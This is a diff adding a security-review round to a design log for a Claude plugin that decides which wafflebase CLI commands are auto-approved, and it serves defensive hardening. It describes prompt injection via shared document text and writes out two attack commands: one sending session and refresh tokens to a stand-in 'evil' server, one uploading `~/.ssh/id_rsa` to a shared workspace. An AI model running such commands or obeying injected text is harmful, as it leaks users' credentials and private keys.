@@ -62,3 +62,42 @@ Not changed (PR known limitation): `plugins/**` has no inert lane in
 new top-level directory done.** knip's dead-code pass lives in
 `verify:entropy`, outside the pre-commit gate, and anything loaded by
 path (hook scripts, CLIs) looks dead to it.
+
+### Round 3 — security / docs (2026-10-07)
+
+Reviewer took the attacker's seat: a collaborator who controls document
+text Claude reads.
+
+Blocking (fixed, regression-tested):
+1. `wafflebase --server https://evil… docs list` → **allow**. The CLI
+   sends the saved session JWT to any `--server`, and on a 401 POSTs the
+   refresh token there and stores whatever tokens come back — token theft
+   plus session fixation from one line of prompt injection. `--server`,
+   `--api-key` and `--profile` now always ask.
+2. With auto-approve on, `files upload ~/.ssh/id_rsa` → **allow**: local
+   file exfiltration into a shared workspace. Commands that read a local
+   file (`localInputArg`, generated) now always ask.
+
+Non-blocking, fixed: auto-approve covered `api-keys create`, `templates
+publish`, `ctx switch`, `login`, `logout` (now `NEVER_AUTO_APPROVE`);
+workspace names flowed unquoted into SessionStart context (now stripped,
+capped, JSON-quoted); `sh -c` / `env -S` / `eval` strings were not looked
+into; several docs overclaimed what always asks.
+
+Not changed (PR known limitation / Future work): the CLI itself still
+sends a session to any `--server`; binding a session to its issuing
+server is a CLI fix that protects users without the plugin too.
+
+**Lesson — "read-only" is about the server's data, not about the
+user.** Two of the worst findings were commands the registry rightly
+calls read-only or write that move *credentials* or *local files*. A
+guard that grants `allow` must classify by what crosses the machine
+boundary (tokens out, files out, files in), not only by what the server
+mutates. And review from the attacker's position found what two
+correctness-minded rounds did not.
+
+### Outcome
+
+Three rounds, each blocking finding fixed. Round 3's fixes were verified
+by their regression tests and a re-run of the adversarial repros rather
+than a fourth review round (the loop is capped at three).
